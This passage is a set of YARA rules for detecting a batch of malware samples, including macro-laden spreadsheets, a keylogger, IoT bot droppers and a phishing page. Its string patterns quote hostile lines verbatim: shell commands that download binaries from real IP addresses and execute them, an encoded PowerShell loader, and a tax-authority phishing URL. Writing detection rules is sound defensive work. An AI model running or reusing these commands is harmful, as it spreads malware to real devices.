rule sig_713631583f9fa6009da7ac91f5cedec41b057bc1a3d5819a8081517e1844bb60_71363158 {
   meta:
      description = "_subset_batch - file 713631583f9fa6009da7ac91f5cedec41b057bc1a3d5819a8081517e1844bb60_71363158.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "713631583f9fa6009da7ac91f5cedec41b057bc1a3d5819a8081517e1844bb60"
   strings:
      $x1 = "C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $x2 = "C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '32.00'*/
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Microsoft " wide /* score: '28.00'*/
      $s4 = "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" fullword ascii /* score: '24.00'*/
      $s5 = "%programdata%\\Microsoft OneDrive Storage\\MimeTypes\\Default\\mimeobj.dll" fullword wide /* score: '24.00'*/
      $s6 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#Visual" wide /* score: '24.00'*/
      $s7 = "mimeobj.dll" fullword wide /* score: '23.00'*/
      $s8 = "        Public Declare Function RCKE Lib \"advapi32.dll\" Alias \"RegCreateKeyExW\" (            ByVal hKey As Long,            " ascii /* score: '22.00'*/
      $s9 = "C:\\Windows\\System32\\stdole2.tlb" fullword ascii /* score: '21.00'*/
      $s10 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide /* score: '21.00'*/
      $s11 = "pi32.dll" fullword ascii /* score: '20.00'*/
      $s12 = "VBE7.DLL" fullword ascii /* score: '20.00'*/
      $s13 = "*\\G{00020813-0000-0000-C000-000000000046}#1.9#0#C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE#Microsoft Excel " wide /* score: '20.00'*/
      $s14 = "advapi32.dll}0" fullword ascii /* score: '19.00'*/
      $s15 = "        Public Declare Function CP Lib \"kernel32\" Alias \"CreateProcessW\" (                                                  " ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_370aac5241d21c6bfd2e53dff7228d5fffbf2211503c5361a49a36ff36b28fd8_370aac52 {
   meta:
      description = "_subset_batch - file 370aac5241d21c6bfd2e53dff7228d5fffbf2211503c5361a49a36ff36b28fd8_370aac52.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "370aac5241d21c6bfd2e53dff7228d5fffbf2211503c5361a49a36ff36b28fd8"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s3 = "kkkkkkkkkkk" fullword wide /* reversed goodware string 'kkkkkkkkkkk' */ /* score: '18.00'*/
      $s4 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s5 = "/Type /FontDescriptor " fullword ascii /* score: '14.00'*/
      $s6 = "Description: Description: cid:image001.png@01D28083.6FE64A00" fullword wide /* score: '13.00'*/
      $s7 = "    /Producer (Brother Scanner System Image Conversion)" fullword ascii /* score: '12.00'*/
      $s8 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s9 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s10 = "  /BitsPerComponent 8" fullword ascii /* score: '11.00'*/
      $s11 = "/FontDescriptor 52 0 R " fullword ascii /* score: '10.00'*/
      $s12 = "/FontDescriptor 67 0 R " fullword ascii /* score: '10.00'*/
      $s13 = "/Filter [ /FlateDecode ] " fullword ascii /* score: '10.00'*/
      $s14 = "/FontDescriptor 57 0 R " fullword ascii /* score: '10.00'*/
      $s15 = "/FontDescriptor 62 0 R " fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_5b9b4509cd7d4c6970a2749f1c493543fe678e3a82461a9e08a91ebad738dd23_5b9b4509 {
   meta:
      description = "_subset_batch - file 5b9b4509cd7d4c6970a2749f1c493543fe678e3a82461a9e08a91ebad738dd23_5b9b4509.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5b9b4509cd7d4c6970a2749f1c493543fe678e3a82461a9e08a91ebad738dd23"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "https://getabre.com/drH7jT" fullword wide /* score: '22.00'*/
      $s3 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s4 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 1000KB and
      all of them
}

rule sig_651c1273734d972c7cd2ce9ccd89e555cf947a8a60d5e5de70ddb9cb15b7b65f_651c1273 {
   meta:
      description = "_subset_batch - file 651c1273734d972c7cd2ce9ccd89e555cf947a8a60d5e5de70ddb9cb15b7b65f_651c1273.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "651c1273734d972c7cd2ce9ccd89e555cf947a8a60d5e5de70ddb9cb15b7b65f"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "https://getabre.com/Upsox2" fullword wide /* score: '22.00'*/
      $s3 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s4 = "EMAIL:yxe@skswitch.com" fullword ascii /* score: '18.00'*/
      $s5 = "E-MAIL:yxe@skswitch.com" fullword ascii /* score: '18.00'*/
      $s6 = "aaabbbb" wide /* reversed goodware string 'bbbbaaa' */ /* score: '18.00'*/
      $s7 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s8 = "4D4B4F4A4E" ascii /* score: '17.00'*/ /* hex encoded string 'MKOJN' */
      $s9 = "COMMODITY & DESCRIPTION " fullword ascii /* score: '13.00'*/
      $s10 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s11 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s12 = "xl/printerSettings/printerSettings1.bin" fullword ascii /* score: '10.00'*/
      $s13 = "xl/printerSettings/printerSettings3.bin" fullword ascii /* score: '10.00'*/
      $s14 = "xl/printerSettings/printerSettings11.bin" fullword ascii /* score: '10.00'*/
      $s15 = "xl/printerSettings/printerSettings2.bin" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule sig_4_4Keylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file 4-4Keylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "089553c1d6831495bd5ccaed0645f6141adbcccc9ac56d258b489378dbc453b5"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "wlqh.exe" fullword wide /* score: '22.00'*/
      $s3 = "Batch processing completed!" fullword wide /* score: '18.00'*/
      $s4 = "https://github.com/css-minifier" fullword wide /* score: '17.00'*/
      $s5 = "btnProcessAll_Click" fullword ascii /* score: '15.00'*/
      $s6 = "btnProcessAll" fullword wide /* score: '15.00'*/
      $s7 = "Process All" fullword wide /* score: '15.00'*/
      $s8 = " Batch processing" fullword wide /* score: '15.00'*/
      $s9 = "wlqh.pdb" fullword ascii /* score: '14.00'*/
      $s10 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s11 = "GetMinifierSettings" fullword ascii /* score: '9.00'*/
      $s12 = "cssContent" fullword ascii /* score: '9.00'*/
      $s13 = "GetOptimizerSettings" fullword ascii /* score: '9.00'*/
      $s14 = "File Manager" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s15 = "Remove Comments" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_033036c8e1e40d53c90f93a224265cb798c58bf5d48f9e7160a540c958f5b3ad_033036c8 {
   meta:
      description = "_subset_batch - file 033036c8e1e40d53c90f93a224265cb798c58bf5d48f9e7160a540c958f5b3ad_033036c8.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "033036c8e1e40d53c90f93a224265cb798c58bf5d48f9e7160a540c958f5b3ad"
   strings:
      $s1 = "AbQAvAHMAbwBsAC4AdAB4AHQAfABpAGUAeAA=" fullword ascii /* base64 encoded string 'm / s o l . t x t | i e x ' */ /* score: '14.00'*/
      $s2 = "powershell -wind mi -Enc LgAgACgAZwBhAGwAIAB3AGcAPwA/ACkAIAAtAHUAcwBlAGIAIABoAHQAdABwAHMAOgAvAC8AYQBuAGcAZQBsAGEAaQByAHMALgBjAG8" ascii /* score: '9.00'*/
      $s3 = "powershell -wind mi -Enc LgAgACgAZwBhAGwAIAB3AGcAPwA/ACkAIAAtAHUAcwBlAGIAIABoAHQAdABwAHMAOgAvAC8AYQBuAGcAZQBsAGEAaQByAHMALgBjAG8" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      all of them
}

rule sig_03fa7fb2ba9d530afdd0deb7d19496ea34950ed3a0800558f3695d2b5dc34329_03fa7fb2 {
   meta:
      description = "_subset_batch - file 03fa7fb2ba9d530afdd0deb7d19496ea34950ed3a0800558f3695d2b5dc34329_03fa7fb2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "03fa7fb2ba9d530afdd0deb7d19496ea34950ed3a0800558f3695d2b5dc34329"
   strings:
      $s1 = "P0%l:\"px'-" fullword ascii /* score: '9.50'*/
      $s2 = "Si_%d%L" fullword ascii /* score: '8.00'*/
      $s3 = "4*%D%%" fullword ascii /* score: '8.00'*/
      $s4 = "uespemos" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      all of them
}

rule sig_04498b4c1e9f0a910564cd9481dc226104a16c3eba042b13611f32b75607ad2a_04498b4c {
   meta:
      description = "_subset_batch - file 04498b4c1e9f0a910564cd9481dc226104a16c3eba042b13611f32b75607ad2a_04498b4c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "04498b4c1e9f0a910564cd9481dc226104a16c3eba042b13611f32b75607ad2a"
   strings:
      $s1 = "wget http://$server_ip//$binname.$arch -O $execname" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf $execname" fullword ascii /* score: '16.00'*/
      $s3 = "chmod 777 $execname" fullword ascii /* score: '12.00'*/
      $s4 = "./$execname $1" fullword ascii /* score: '12.00'*/
      $s5 = "execname=\"ssh\"" fullword ascii /* score: '12.00'*/
      $s6 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
      $s7 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6962 and filesize < 1KB and
      all of them
}

rule sig_50ccd7cd274ea9f849c4d831f50aa0ffdcf4708594aee8b3c8fce377b384ea38_50ccd7cd {
   meta:
      description = "_subset_batch - file 50ccd7cd274ea9f849c4d831f50aa0ffdcf4708594aee8b3c8fce377b384ea38_50ccd7cd.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "50ccd7cd274ea9f849c4d831f50aa0ffdcf4708594aee8b3c8fce377b384ea38"
   strings:
      $s1 = "    curl http://$server_ip/$binname.$arch -O $execname" fullword ascii /* score: '17.00'*/
      $s2 = "execname=\"dlink\"" fullword ascii /* score: '12.00'*/
      $s3 = "    rm -rf $execname" fullword ascii /* score: '11.00'*/
      $s4 = "server_ip=\"109.205.213.5\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_4b84e1ccf559af01cc292e7f0df405578562346fc704642953daa24b79937a2d_4b84e1cc {
   meta:
      description = "_subset_batch - file 4b84e1ccf559af01cc292e7f0df405578562346fc704642953daa24b79937a2d_4b84e1cc.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4b84e1ccf559af01cc292e7f0df405578562346fc704642953daa24b79937a2d"
   strings:
      $s1 = "busybox tftp -g -r mips 160.250.134.51; tftp -g -r mips 160.250.134.51; chmod 777 mips; ./mips raisecom2; rm mips" fullword ascii /* score: '28.00'*/
      $s2 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_04ba61b30b4469b6953b018b576ec53ccc752b2304fad1c98dbe1dadae70478a_04ba61b3 {
   meta:
      description = "_subset_batch - file 04ba61b30b4469b6953b018b576ec53ccc752b2304fad1c98dbe1dadae70478a_04ba61b3.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "04ba61b30b4469b6953b018b576ec53ccc752b2304fad1c98dbe1dadae70478a"
   strings:
      $s1 = "zapper.ps1" fullword ascii /* score: '8.00'*/
      $s2 = "abdh.ps1" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 600KB and
      all of them
}

rule sig_04e378b653cb975609ab637eef36bf92d26867dcd79fb90c5f7e1993019eff91_04e378b6 {
   meta:
      description = "_subset_batch - file 04e378b653cb975609ab637eef36bf92d26867dcd79fb90c5f7e1993019eff91_04e378b6.msc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "04e378b653cb975609ab637eef36bf92d26867dcd79fb90c5f7e1993019eff91"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                       ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                             ' */ /* score: '26.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */ /* score: '26.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                 ' */ /* score: '26.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */ /* score: '26.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                      ' */ /* score: '26.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */ /* score: '26.50'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 4000KB and
      8 of them
}

rule sig_20b90d4f56029a19868023288e8552ccda6a62fdda33fe177f3a5f4d0e9cf7d1_20b90d4f {
   meta:
      description = "_subset_batch - file 20b90d4f56029a19868023288e8552ccda6a62fdda33fe177f3a5f4d0e9cf7d1_20b90d4f.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "20b90d4f56029a19868023288e8552ccda6a62fdda33fe177f3a5f4d0e9cf7d1"
   strings:
      $x1 = "\"BTlUwbMQIdY+S0OOjVvW6Lv0A+7Sd+lnrqoN+JNgqRY+cZTY7lgPU8CX48D9DTNuq01c+VHVADeIVSCy8xb0Duv9b1UdP7HiGzE+kL8L0LDBCPwD8OdW/iAC5wFwjg" ascii /* score: '54.00'*/
      $x2 = "\"UJVEg32fKgmMvDjE9Ki6IvLxmaw/5MGpLNKfEnUKnFRFSN4hqg7IQsmQvosKXhYIdwS9q2nQwZDdbExPhIT8N3f62/CQbwx9npKpKq2BiVtLO03SehPkKrarxMl7iV" ascii /* score: '51.00'*/
      $x3 = "\"DF0/IkyC+a30nQjZJ3ZsuDJiQXA2TfXxowCbKHyHrgeinYZpOmYKpMNdXfQjokogvDLo1zIznJD74uTqeGSUGnCJUPauLO1Z+Rk8Sd6dxZzZ0XuYMV7C3dBLXk1CHW" ascii /* score: '50.00'*/
      $x4 = "\"0BvRcUpaTFQKfVmA/QdE1B950Y/1E/9E0Ng9os45tY/vYMXYO/vkue8resC8suh3fTi42U+cS2y1v2nfth/ZT+4X9xv5gf7EjO9Gd2E58J7HDvU+gE+JkcrKJ5Cgd6" ascii /* score: '49.00'*/
      $x5 = "\"T47SLd6Sfo9plaZWPUCr+vjHW1W9i+8XtrzBq49mSsu0you6q50KUx/dEeBOIwhXPSva1e+6Se/phO+J8L5J5wmC94BNerkqPmBWsoBLFOkJ2Fv9mTnGp5OBBemO0Y" ascii /* score: '48.00'*/
      $x6 = "\"3XfJu7xfrxXsfJXyw/ue39+v/Je39587/Te0dwGbXi8E7mfXVN6ZtXmZmTpY1I8+elJu1aI53m95LpWh5xNtY7zXiUXuG3HzyyA43Yhk2/D/ePFN6WbzPUML5l38+z" ascii /* score: '48.00'*/
      $x7 = "\"to5Bh2YnAsCevkR4erNSrKuH3OZLrGAsp4RCjEtZ480WMjjeks5kZTVoGMINplp7Tt0dmI/h75wOAfzzib8E7y9N2EqWNDsBsg+hHWl3p+rqevqrW9WpM/XXNzAyDv" ascii /* score: '48.00'*/
      $x8 = "\"cPFxpQrsnyYXKNO4gViLouxawNJgqmj9K+Wn9gvTPgMo6QRpT6ISOkjZBGWNfc+2ggNsZRh3gcdbMeRx2Ll5fH9int1bgNXNuHPQJuckIuX4ey9cHXITLSTwrBfERq" ascii /* score: '47.00'*/
      $x9 = "\"rqTk0dGUi0FfKrkn/IvyFsfgKtkKyVDZ0ge/qK2kLOVo52ztJP8BYLIaXpcCda+6yMxDpNiTjsn2OE/8JNrGiUqCP+oN30JY5Y3yjL3+qEod+CR6x2lLJOkFZ1+SPW" ascii /* score: '47.00'*/
      $x10 = "JpaCUzPldHjC6=\"pxSgP+L7kU56KuwkOuIfd9hZeT3qkeirOFxtw+lMZ9ghlSj0R6LH1r9+qnzah+W/IQVM0luKNnOerJFaofA4vB/R098rDrfVeCK0P/iBAprpXPnV" ascii /* score: '47.00'*/
      $x11 = "\"o/ELmDLGePjgUO4x+EfNLB1PfDeixop7OiWnANQTlRF4ArEpiqJeGjxDW41wlNdK8tmzOmG35vBwdsaF1ezrT0CBu9rR1xJh/QEp68apTPaFJjUVDw/XbO67vWM1yP" ascii /* score: '47.00'*/
      $x12 = "\"JrvMssFwiCe9xxKff43Kchd8o2u2jY+/K5Q1kn//YzXWt+pnsusM7BBk1RrDjqk1fh5/kN2gHjfshsxd0nuRVP53Mr5nwqB3aiqbM27TPDEKnvZZt+U3ykE615o3rv" ascii /* score: '47.00'*/
      $x13 = "\"ak1KQYD+vjCk9xdUhxdUxxRfi6QKJwgoS/cLaDvwafCf4GlTmYczIMZifk96uzOckWbX2u3Inl++0Mn0CtovDlhCXY5B1haUDbInJSJKs7g+YZoCgn6GWsjR8cMDRi" ascii /* score: '47.00'*/
      $x14 = "\"nWNWq+V5pjTFK/6FTfGEg8BHaQbxp8x2aVa39RffWR2zscvX2anhJbQhNayd3i0rmVLuWZVcNXgk32iM/xQN0UeyW3Nb3p9MxFffh9nO4zgVT9IJB7TfoMb0lfjCJx" ascii /* score: '47.00'*/
      $x15 = "\"vV52F9aNvKst+tpAVwD7Vdl8qW+ZXxEKXFLI14LZ3HsWKwEV0GsUq0A/y2howim0GtxHep0L6sNmFrPqZFLZ5XgqLBLfq1lR2YB7EhXyz7k1lg95NYbEjN7Gp4LbDd" ascii /* score: '46.00'*/
   condition:
      uint16(0) == 0x3a3a and filesize < 25000KB and
      1 of ($x*)
}

rule sig_6180a1d732df3621db80547243b8157f444e817b73c94c6b41256ff3ad5aa40b_6180a1d7 {
   meta:
      description = "_subset_batch - file 6180a1d732df3621db80547243b8157f444e817b73c94c6b41256ff3ad5aa40b_6180a1d7.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6180a1d732df3621db80547243b8157f444e817b73c94c6b41256ff3ad5aa40b"
   strings:
      $s1 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '28.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                          ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAB" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s7 = "AAAAAABAAA" ascii /* base64 encoded string '     @ ' */ /* score: '16.50'*/
      $s8 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */ /* score: '16.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                   ' */ /* score: '16.50'*/
      $s10 = "AEAAAAAAAA" ascii /* base64 encoded string ' @     ' */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAABB" ascii /* base64 encoded string '        A' */ /* score: '16.50'*/
      $s12 = "DAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* score: '16.50'*/
      $s13 = "QAAAzV2YpZnclNlYldlL51kDAEwEAAgclNXVukXTHAQAMAAAu9Wa0F2YpxGcwFkL51kDAEwEAAgclRXdw12bD5SeNtAABABAAAwXfV2YuFGdz5WSf9VZz9GczlGRT81X" ascii /* score: '16.00'*/
      $s14 = "AAAAAAAAAAA8" ascii /* base64 encoded string '        <' */ /* score: '15.00'*/
      $s15 = "0VmTu0WZ0NXeTBwczVGd5JGAzNXZyRGZBBVSAM3clN2byBFAzNXYw91UAM3chBFAzJ3b0FmclB3TAMnclBHblhUZtlGduVnUAMnchh2QfRXZnBwcvZmbp9FZyF2QfRXZ" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x413d and filesize < 200KB and
      8 of them
}

rule sig_647b74a5ffa032ab53a05a4b0c13c3bb185ff1a6f45fdc9d170c7291a106030d_647b74a5 {
   meta:
      description = "_subset_batch - file 647b74a5ffa032ab53a05a4b0c13c3bb185ff1a6f45fdc9d170c7291a106030d_647b74a5.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "647b74a5ffa032ab53a05a4b0c13c3bb185ff1a6f45fdc9d170c7291a106030d"
   strings:
      $s1 = "<center><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABdYAAADeCAYAAAAw51IBAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAA" ascii /* score: '26.00'*/
      $s2 = "AAAAAAAAAEA" ascii /* base64 encoded string '       @' */ /* score: '16.50'*/
      $s3 = "uGl4afmN4YFH+n1TQjsS6F6+fHm4+OKL43PV5dEp8szxo48+OixatCje3S55LPny0xtuuKGblixZEh5++OH8aH9Spy0vSYLq0s5tt93W3Sf1NrkLvo3HH388XH755eHH" ascii /* score: '16.00'*/
      $s4 = "6quvXijzD//wD7E+McjAujjttNMKdUmSYP7rXve6cOCBB8bjZ5xxRjj88MPD2972ttJYJX33u9/NawMAAAAAAONZFkirCMABwBQw7gLr4pw/fTd7HEwMkGugvJc0eC5J" ascii /* score: '16.00'*/
      $s5 = "hsA6MAL0H6yp+g/QVB8/AAAAAKBIPifawLoGbiVgnNq2+X2QV7flrup+gXV/TH5KOW1H6pTjkk/U1WX5wHWKtKF9tvl9G3Z8qXqlnib9tWVT9fiydlvK22Op8gCKCKwD" ascii /* score: '16.00'*/
      $s6 = "aSrtfOpf8lyDF9vdaV4YXAt/DId0+nzIFflmyhWHdMa1c5jXP9wyzmRja3t+/nLqzr38h5ZjMp0cYd5OxTp9qpzPOJct8rdUty41DW195mNOzscEtGxe2LkzFzrv8ZwP" ascii /* score: '16.00'*/
      $s7 = "BWeeGa688spY14V/PiJ8ZcG0MNME1iWddzPBdQAAAAAAAACY7KZEYP2me38TZp7xlvD5uVkgPbtbXQLq2U/5wtKv/HLtsP+5xUD5vp30zcVbhpv/ujg89uR94aGVS2NQ" ascii /* score: '16.00'*/
      $s8 = "AAAAAAAAAAC0" ascii /* base64 encoded string '       -' */ /* score: '15.00'*/
      $s9 = "<meta http-equiv=\"refresh\"content=\"2; URL='https://autoridade-tributaria-pt.org/SET-FAT/818.php'\"/>" fullword ascii /* score: '15.00'*/
      $s10 = "8fC3i8+MLh13AbsYkCwE+8r1F/PIcROwlSBkoXzWfgwQFoKvkqqCmDa/CUgmg4vF/g2l/zHAWcXW1af9LJjrA+u2fR/Ybjn+Unm/Lak83t7v5fz9x56XrwzsZseLY7dB" ascii /* score: '14.00'*/
      $s11 = "AAAAAAAAAAAAa" ascii /* base64 encoded string '         ' */ /* score: '14.00'*/
      $s12 = "07AC6z7glisEipJ58sCSCwAWg315cMwEjur7avtXDFyprF8aCEvnqRqTKtahinOT7mdxjOmAm5P3RQPQvfnJ+67HdAwuf10qzJPub7AOsvFrGTMPvu2BBvwS56riPBXW" ascii /* score: '14.00'*/
